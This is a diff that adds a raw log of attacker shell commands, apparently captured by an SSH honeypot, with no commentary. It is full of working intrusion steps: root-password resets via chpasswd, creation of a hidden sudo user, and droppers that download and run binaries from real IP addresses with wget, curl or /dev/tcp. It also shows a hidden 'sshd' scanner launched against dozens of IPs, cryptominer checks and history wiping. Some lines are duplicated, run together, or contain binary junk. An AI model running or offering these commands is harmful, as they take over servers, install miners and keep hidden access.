@@ -69,7 +69,146 @@ echo "root:Kqor3HCzGhen"|chpasswd|bash
 
 curl -o /dev/null https://www.geelark.comcurl -o /dev/null https://www.geelark.com
 
-Nået til daef
+echo "root:QPMVgQUjFyfv"|chpasswd|bash
+
+curl -o /dev/null https://optimiser.website/curl -o /dev/null https://optimiser.website/
+
+echo "root:Tpe86rmi18m0"|chpasswd|bash
+
+echo "root:Mp4t0NeCnubM"|chpasswd|bash
+
+curl -o /dev/null https://www.geelark.comcurl -o /dev/null https://www.geelark.com
+
+echo "root:RuL9PEnKlKZ2"|chpasswd|bash
+
+echo "root:o3hdET0lorlO"|chpasswd|bash
+
+chmod +x ./.618647558533248543/sshd;nohup ./.618647558533248543/sshd 223.221.10.114 103.142.199.43 143.110.178.185 185.204.2.136 162.248.103.24 3.109.49.117 23.94.136.106 150.139.210.85 64.226.87.206 156.238.100.45 120.48.231.197 50.34.90.148 101.64.131.9 157.230.97.85 39.170.90.242 107.155.87.60 31.192.233.86 103.142.199.128 103.205.60.32 223.247.157.191 20.28.19.241 154.83.13.60 217.144.185.121 129.80.90.5 85.28.47.95 3.112.19.24 2.187.255.175 69.55.60.190 58.209.80.14 163.172.34.113 36.133.255.176 18.222.155.237 3.85.203.82 36.112.148.210 114.216.3.20 2.187.255.114 103.145.145.73 37.60.229.54 203.253.23.39 14.29.167.193 125.124.106.113 147.45.49.130 111.22.249.19 172.93.110.13 125.124.158.28 60.191.23.20 103.12.76.73 170.84.39.236 178.20.43.203 54.172.172.93 101.91.181.235 &
+
+ps -ef | grep '[Mm]iner'
+
+curl -o /dev/null https://kvetku.by/curl -o /dev/null https://kvetku.by/
+
+echo "root:Kqor3HCzGhen"|chpasswd|bash
+
+apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 9TZF2pUM) system && sudo usermod -aG sudo system
+
+ls -la /var/run/gcc.pid
+
+uname -m
+
+echo -e "\x6F\x6B"
+
+echo "root:ONFhSzGARGDH"|chpasswd|bash
+
+#!/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wget http://43.249.172.195:888/112
+curl -O http://43.249.172.195:888/112
+chmod +x 112
+./112
+wget http://43.249.172.195:888/112s
+curl -O http://43.249.172.195:888/112s
+chmod +x 112s
+./112s
+rm -rf 112.sh
+rm -rf 112
+rm -rf 112s
+history -c
+
+echo "root:jQ6MZdtF2QyM"|chpasswd|bash
+
+nproc
+
+apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 sfxftCZS) system && sudo usermod -aG sudo system
+
+echo "root:RRGhialJru6H"|chpasswd|bash
+
+echo "root:3pmuATuUGHap"|chpasswd|bash
+
+root@dev_api03:~# echo 1 && cat /bin/echo
+1
+ELF>x@@�@8@@@yy �.shstrtab.text
+                               x@xy
+root@dev_api03:~# nohup $SHELL -c "curl http://8.217.109.189:60145/linux -o /tmp/PQhBwDFx0l; if [ ! -f /tmp/PQhBwDFx0l ]; then wget http://8.217.109.189:60145/linux -O /tmp/PQhBwDFx0l; fi; if [ ! -f /tmp/PQhBwDFx0l ]; then exec 6<>/dev/tcp/8.217.109.189/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/PQhBwDFx0l && chmod +x /tmp/PQhBwDFx0l && /tmp/PQhBwDFx0l xPP0SkGGc91JU9h6mFZK8+m/ueL1T1iQbNtPT8dzn0xW9Oa5s+X1SUybYtFTT9h1hklI/P24ser/TkiZdtxdRcdwmUBW9OG8p+r0Qk6Yc9tLXdFsmklI6+G6sP30TU6SdNlMSdhinE9W9+a4p+L1SFaQctNLTdhwn1hM8v2xsf3wQVaRctNLTdhxnVhM8v27uurrTEuGc9pHS9lznElY/f27uOPrSkyebNBHS9lzmU1Y8eSnu+bxVkmac8dOSdN0mElM/fO9vv33S0+GcdlTTNl1kk5I9OG7qefyVkqbdcdMTNpsnUFC8+O4uublTE+GcNpLU9h3kFZJ9+azv+P0S0mIdt5TRdBsmktK6+KxvOnzSEmYd8lJSsdwm09W9+SnuOv9Qk6Yc9lJXdFsmklB6+a4p+HwTUKecthORMkZmhlJ9+m8sOf1QhvJc4tHR9sfkk5I9OG5qeL3TVaZcN1TTNl1hkpL/Om/ueL2S1icdcdFRcd0mlZL8Om/ueL2SVicdcdFRcdzmEpW/Oezv+P0TE+IesdPTNlsmktB6+K8v+nzSEmcc8lMT9psnU9W9OC6p+f3Qk6Yc9pFXd11hkpL/f27u+PrQUGSdNlMTdpinE9W/eCnsf30TkySdNlMT9pinE9W9+C/p+LzS1aZetxHS9lzmkpY9OG8p+L3TFaRdMdMT9N0mElK9/O9vv33TUmGc9lOU9x6kk5I9Oe/qevyVkmYdcdMSttsmkxN/+W5uOP8WECGcNhKU9hykVZJ/eqzv+P0TE2Idt5TSt9skUBW9Oa5s+X1SUqeI8PidkvHvv34hRT8bzMOJxCqkYM=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/PQhBwDFx0l && /tmp/PQhBwDFx0l xPP0SkGGc91JU9h6mFZK8+m/ueL1T1iQbNtPT8dzn0xW9Oa5s+X1SUybYtFTT9h1hklI/P24ser/TkiZdtxdRcdwmUBW9OG8p+r0Qk6Yc9tLXdFsmklI6+G6sP30TU6SdNlMSdhinE9W9+a4p+L1SFaQctNLTdhwn1hM8v2xsf3wQVaRctNLTdhxnVhM8v27uurrTEuGc9pHS9lznElY/f27uOPrSkyebNBHS9lzmU1Y8eSnu+bxVkmac8dOSdN0mElM/fO9vv33S0+GcdlTTNl1kk5I9OG7qefyVkqbdcdMTNpsnUFC8+O4uublTE+GcNpLU9h3kFZJ9+azv+P0S0mIdt5TRdBsmktK6+KxvOnzSEmYd8lJSsdwm09W9+SnuOv9Qk6Yc9lJXdFsmklB6+a4p+HwTUKecthORMkZmhlJ9+m8sOf1QhvJc4tHR9sfkk5I9OG5qeL3TVaZcN1TTNl1hkpL/Om/ueL2S1icdcdFRcd0mlZL8Om/ueL2SVicdcdFRcdzmEpW/Oezv+P0TE+IesdPTNlsmktB6+K8v+nzSEmcc8lMT9psnU9W9OC6p+f3Qk6Yc9pFXd11hkpL/f27u+PrQUGSdNlMTdpinE9W/eCnsf30TkySdNlMT9pinE9W9+C/p+LzS1aZetxHS9lzmkpY9OG8p+L3TFaRdMdMT9N0mElK9/O9vv33TUmGc9lOU9x6kk5I9Oe/qevyVkmYdcdMSttsmkxN/+W5uOP8WECGcNhKU9hykVZJ/eqzv+P0TE2Idt5TSt9skUBW9Oa5s+X1SUqeI8PidkvHvv34hRT8bzMOJxCqkYM=" &
+nohup: ignoring input and appending output to 'nohup.out'
+root@dev_api03:~# head -c 2382100 > /tmp/tl4EHelTa1
+root@dev_api03:~# x@@8>ELF
+root@dev_api03:~# nohup $SHELL -c "curl http://8.217.109.189:60145/linux -o /tmp/PQhBwDFx0l; if [ ! -f /tmp/PQhBwDFx0l ]; then wget http://8.217.109.189:60145/linux -O /tmp/PQhBwDFx0l; fi; if [ ! -f /tmp/PQhBwDFx0l ]; then exec 6<>/dev/tcp/8.217.109.189/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/PQhBwDFx0l && chmod +x /tmp/PQhBwDFx0l && /tmp/PQhBwDFx0l xPP0SkGGc91JU9h6mFZK8+m/ueL1T1iQbNtPT8dzn0xW9Oa5s+X1SUybYtFTT9h1hklI/P24ser/TkiZdtxdRcdwmUBW9OG8p+r0Qk6Yc9tLXdFsmklI6+G6sP30TU6SdNlMSdhinE9W9+a4p+L1SFaQctNLTdhwn1hM8v2xsf3wQVaRctNLTdhxnVhM8v27uurrTEuGc9pHS9lznElY/f27uOPrSkyebNBHS9lzmU1Y8eSnu+bxVkmac8dOSdN0mElM/fO9vv33S0+GcdlTTNl1kk5I9OG7qefyVkqbdcdMTNpsnUFC8+O4uublTE+GcNpLU9h3kFZJ9+azv+P0S0mIdt5TRdBsmktK6+KxvOnzSEmYd8lJSsdwm09W9+SnuOv9Qk6Yc9lJXdFsmklB6+a4p+HwTUKecthORMkZmhlJ9+m8sOf1QhvJc4tHR9sfkk5I9OG5qeL3TVaZcN1TTNl1hkpL/Om/ueL2S1icdcdFRcd0mlZL8Om/ueL2SVicdcdFRcdzmEpW/Oezv+P0TE+IesdPTNlsmktB6+K8v+nzSEmcc8lMT9psnU9W9OC6p+f3Qk6Yc9pFXd11hkpL/f27u+PrQUGSdNlMTdpinE9W/eCnsf30TkySdNlMT9pinE9W9+C/p+LzS1aZetxHS9lzmkpY9OG8p+L3TFaRdMdMT9N0mElK9/O9vv33TUmGc9lOU9x6kk5I9Oe/qevyVkmYdcdMSttsmkxN/+W5uOP8WECGcNhKU9hykVZJ/eqzv+P0TE2Idt5TSt9skUBW9Oa5s+X1SUqeI8PidkvHvv34hRT8bzMOJxCqkYM=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/PQhBwDFx0l && /tmp/PQhBwDFx0l xPP0SkGGc91JU9h6mFZK8+m/ueL1T1iQbNtPT8dzn0xW9Oa5s+X1SUybYtFTT9h1hklI/P24ser/TkiZdtxdRcdwmUBW9OG8p+r0Qk6Yc9tLXdFsmklI6+G6sP30TU6SdNlMSdhinE9W9+a4p+L1SFaQctNLTdhwn1hM8v2xsf3wQVaRctNLTdhxnVhM8v27uurrTEuGc9pHS9lznElY/f27uOPrSkyebNBHS9lzmU1Y8eSnu+bxVkmac8dOSdN0mElM/fO9vv33S0+GcdlTTNl1kk5I9OG7qefyVkqbdcdMTNpsnUFC8+O4uublTE+GcNpLU9h3kFZJ9+azv+P0S0mIdt5TRdBsmktK6+KxvOnzSEmYd8lJSsdwm09W9+SnuOv9Qk6Yc9lJXdFsmklB6+a4p+HwTUKecthORMkZmhlJ9+m8sOf1QhvJc4tHR9sfkk5I9OG5qeL3TVaZcN1TTNl1hkpL/Om/ueL2S1icdcdFRcd0mlZL8Om/ueL2SVicdcdFRcdzmEpW/Oezv+P0TE+IesdPTNlsmktB6+K8v+nzSEmcc8lMT9psnU9W9OC6p+f3Qk6Yc9pFXd11hkpL/f27u+PrQUGSdNlMTdpinE9W/eCnsf30TkySdNlMT9pinE9W9+C/p+LzS1aZetxHS9lzmkpY9OG8p+L3TFaRdMdMT9N0mElK9/O9vv33TUmGc9lOU9x6kk5I9Oe/qevyVkmYdcdMSttsmkxN/+W5uOP8WECGcNhKU9hykVZJ/eqzv+P0TE2Idt5TSt9skUBW9Oa5s+X1SUqeI8PidkvHvv34hRT8bzMOJxCqkYM=" &                                                        >echo 1 && cat /bin/echoQtd#UPX!
+1
+cat: /bin/echoQtd: No such file or directory
+root@dev_api03:~# echo 1 && cat /bin/echoQtd#UPX!W'8
+1
+cat: /bin/echoQtd: No such file or directory
+root@dev_api03:~# W3c4T- / o.
+root@dev_api03:~# p
+root@dev_api03:~# o
+
+echo "root:TRLAky1hOC7J"|chpasswd|bash
+
+echo "root:JJ4DE8o9xLgt"|chpasswd|bash
+
+root@dev_api03:~# echo 1 && cat /bin/echo
+1
+ELF>x@@�@8@@@yy �.shstrtab.text
+                               x@xy
+root@dev_api03:~# nohup $SHELL -c "curl http://62.152.38.152:60140/linux -o /tmp/qxjxFkWyjE; if [ ! -f /tmp/qxjxFkWyjE ]; then wget http://62.152.38.152:60140/linux -O /tmp/qxjxFkWyjE; fi; if [ ! -f /tmp/qxjxFkWyjE ]; then exec 6<>/dev/tcp/62.152.38.152/60140 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/qxjxFkWyjE && chmod +x /tmp/qxjxFkWyjE && /tmp/qxjxFkWyjE Wd6niReh8uvr7rYSn6fJICLIpoAQv+Dv6vOhE4iu0Ckg0K+AGLnw7+/1rxSDuM8tKtCliQy+9ezk9r8ThabeKSrNuIQVofLr7u6+EoesyCgpzqKRE7r08OzwuwyAocc2Kc+jixS/8e/r4LsVn6/INinLop8Tuvfk6PC+E4a2zyos0KSDEaHx6/DxuhqLoM4pKs+2hBqh8urp7r0XhbjPKyvEoIETvPb+7fmhE4Gj0CksxriDF7366O7xvReRpcc2Ica4gheh8ebk9r8TgaTeKSnIuIAbt+7s7vChE4SvxC4oz6KGArr58O32oROHrtApKMishxK+8ub+8b0Sn6HJNinLr58TvfPk6PC+EIe2zyoo0KGGDLjw8Oz6uRKAoso4LMm4iBuh8enm7r4ShqzIKCnKoZEWuO7v7/WhEICu0CktxqyHEr7x6f70uAyIoNAhKtCkhRi58O/t868Wg7jPISrQpIEbofTq5Pa/E4Wn3i0g0KSFFaHy6+ruvhOHrMgoKc2hkRe77uzt96EUhbjILCLIpoAQuODr7u6+FZ+nyyo2zKWGGLnw7+z5rxOBoNApLNCkhRqh8e7k9r8ThaPeKyzQpIESofLv7O62EYugzikrz7aAELvu7OzxoRGBuMciLs6nghSv9O3w8bsRn6DONinIpYsUv/Hq6uC+EIW4zCoo0KOFDL715OjwvhCIts8gKtCvgwy+9enw9bkYh6bPKijep4AUofHn5u69EoG4zy0hxKCBE73y/u/xuQyAosY2Ks6nnxO78uTo8L4RgbbPKS7Qp4gUofHu6+69E4ugzikoypNIFmmEeUNWiIP2ptiAtos+Lg==; fi; echo password > /tmp/.opass; chmod +x /tmp/qxjxFkWyjE && /tmp/qxjxFkWyjE Wd6niReh8uvr7rYSn6fJICLIpoAQv+Dv6vOhE4iu0Ckg0K+AGLnw7+/1rxSDuM8tKtCliQy+9ezk9r8ThabeKSrNuIQVofLr7u6+EoesyCgpzqKRE7r08OzwuwyAocc2Kc+jixS/8e/r4LsVn6/INinLop8Tuvfk6PC+E4a2zyos0KSDEaHx6/DxuhqLoM4pKs+2hBqh8urp7r0XhbjPKyvEoIETvPb+7fmhE4Gj0CksxriDF7366O7xvReRpcc2Ica4gheh8ebk9r8TgaTeKSnIuIAbt+7s7vChE4SvxC4oz6KGArr58O32oROHrtApKMishxK+8ub+8b0Sn6HJNinLr58TvfPk6PC+EIe2zyoo0KGGDLjw8Oz6uRKAoso4LMm4iBuh8enm7r4ShqzIKCnKoZEWuO7v7/WhEICu0CktxqyHEr7x6f70uAyIoNAhKtCkhRi58O/t868Wg7jPISrQpIEbofTq5Pa/E4Wn3i0g0KSFFaHy6+ruvhOHrMgoKc2hkRe77uzt96EUhbjILCLIpoAQuODr7u6+FZ+nyyo2zKWGGLnw7+z5rxOBoNApLNCkhRqh8e7k9r8ThaPeKyzQpIESofLv7O62EYugzikrz7aAELvu7OzxoRGBuMciLs6nghSv9O3w8bsRn6DONinIpYsUv/Hq6uC+EIW4zCoo0KOFDL715OjwvhCIts8gKtCvgwy+9enw9bkYh6bPKijep4AUofHn5u69EoG4zy0hxKCBE73y/u/xuQyAosY2Ks6nnxO78uTo8L4RgbbPKS7Qp4gUofHu6+69E4ugzikoypNIFmmEeUNWiIP2ptiAtos+Lg==" &
+nohup: ignoring input and appending output to 'nohup.out'
+root@dev_api03:~# head -c 0 > /tmp/Z5v3xGAwRV
+root@dev_api03:~# chmod 777 /tmp/Z5v3xGAwRV
+root@dev_api03:~# /tmp/Z5v3xGAwRV Wd6niReh8uvr7rYSn6fJICLIpoAQv+Dv6vOhE4iu0Ckg0K+AGLnw7+/1rxSDuM8tKtCliQy+9ezk9r8ThabeKSrNuIQVofLr7u6+EoesyCgpzqKRE7r08OzwuwyAocc2Kc+jixS/8e/r4LsVn6/INinLop8Tuvfk6PC+E4a2zyos0KSDEaHx6/DxuhqLoM4pKs+2hBqh8urp7r0XhbjPKyvEoIETvPb+7fmhE4Gj0CksxriDF7366O7xvReRpcc2Ica4gheh8ebk9r8TgaTeKSnIuIAbt+7s7vChE4SvxC4oz6KGArr58O32oROHrtApKMishxK+8ub+8b0Sn6HJNinLr58TvfPk6PC+EIe2zyoo0KGGDLjw8Oz6uRKAoso4LMm4iBuh8enm7r4ShqzIKCnKoZEWuO7v7/WhEICu0CktxqyHEr7x6f70uAyIoNAhKtCkhRi58O/t868Wg7jPISrQpIEbofTq5Pa/E4Wn3i0g0KSFFaHy6+ruvhOHrMgoKc2hkRe77uzt96EUhbjILCLIpoAQuODr7u6+FZ+nyyo2zKWGGLnw7+z5rxOBoNApLNCkhRqh8e7k9r8ThaPeKyzQpIESofLv7O62EYugzikrz7aAELvu7OzxoRGBuMciLs6nghSv9O3w8bsRn6DONinIpYsUv/Hq6uC+EIW4zCoo0KOFDL715OjwvhCIts8gKtCvgwy+9enw9bkYh6bPKijep4AUofHn5u69EoG4zy0hxKCBE73y/u/xuQyAosY2Ks6nnxO78uTo8L4RgbbPKS7Qp4gUofHu6+69E4ugzikoypNIFmmEeUNWiIP2ptiAtos+Lg==
+-bash: /tmp/Z5v3xGAwRV: command not found
+root@dev_api03:~# cp /tmp/Z5v3xGAwRV /tmp/linux
+root@dev_api03:~# head -c 0 > miner_sign
+root@dev_api03:~# head -c 0 > winminer_sign
+root@dev_api03:~# head -c 0 > mipsel_linux_sign
+root@dev_api03:~# head -c 0 > mipsel_linux
+root@dev_api03:~# head -c 0 > winminer
+root@dev_api03:~# head -c 0 > mips_linux
+root@dev_api03:~# head -c 0 > mips_linux_sign
+root@dev_api03:~# head -c 0 > arm_linux
+root@dev_api03:~# head -c 0 > arm_linux_sign
+root@dev_api03:~# head -c 0 > linux_sign
+root@dev_api03:~# head -c 0 > windows
+root@dev_api03:~# head -c 0 > windows_sign
+root@dev_api03:~# head -c 0 > miner
+root@dev_api03:~#
+root@dev_api03:~# exit
+
+whoami
+
+echo "root:1lmrRrZxhqo6"|chpasswd|bash
+
+echo "root:dMjKw7pKNMgd"|chpasswd|bash
+
+echo "root:gqRX1OiW0uGH"|chpasswd|bash
+
+curl -o /dev/null https://www.geelark.com
+
+echo "root:gYp5REiIACq8"|chpasswd|bash
+
+curl -o /dev/null https://management.tg-project.ru/
+
+echo "root:f1W40nNz7jCu"|chpasswd|bash
+
+crontab -l
+
+echo "root:Qcy3bKRJjS5l"|chpasswd|bash
+
+curl -o /dev/null https://management.tg-project.ru/curl -o /dev/null https://management.tg-project.ru/
+
+echo "root:SgJRsYbRsmxH"|chpasswd|bash
+
+echo "root:Kt0jeib7tWoi"|chpasswd|bash
+
+curl -o /dev/null https://ocat.by
+
+apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wfVershh) system && sudo usermod -aG sudo system
+
+echo "root:kjo4eZSF6trP"|chpasswd|bash
+
+cat /etc/issue; sh -c 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.91.193.133/atp || curl -O http://45.91.193.133/atp; chmod +x atp; sh atp; rm -rf atp'; history -c
+
 
 
 
